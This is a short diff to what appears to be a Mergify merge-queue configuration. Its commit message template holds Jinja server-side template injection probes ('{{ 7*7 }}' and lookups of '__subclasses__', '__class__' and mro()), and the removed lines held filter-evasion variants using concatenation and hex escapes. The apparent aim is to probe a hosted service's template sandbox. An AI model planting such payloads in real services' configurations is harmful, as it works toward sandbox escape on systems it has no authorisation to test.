@@ -5,11 +5,10 @@ queue_rules:
     merge_method: squash
     commit_message_template: |
       SSTI: {{ 7*7 }}
-      S1_AUTO: {{ dict['__subclasses__'] }}
-      S2_CAT: {{ dict['__subcla'~'sses__'] }}
-      S3_HEX: {{ dict['\x5f\x5fsubclasses\x5f\x5f'] }}
-      S4_SC_LEN: {{ dict['__subclasses__']|length }}
-      S5_CLASS: {{ dict['__class__'] }}
+      SC: {{ dict['__subclasses__'] }}
+      SC_LEN: {{ dict['__subclasses__']|length }}
+      CLASS: {{ dict['__class__'] }}
+      MRO: {{ dict['__class__'].mro() }}
 pull_request_rules:
   - name: q
     conditions:
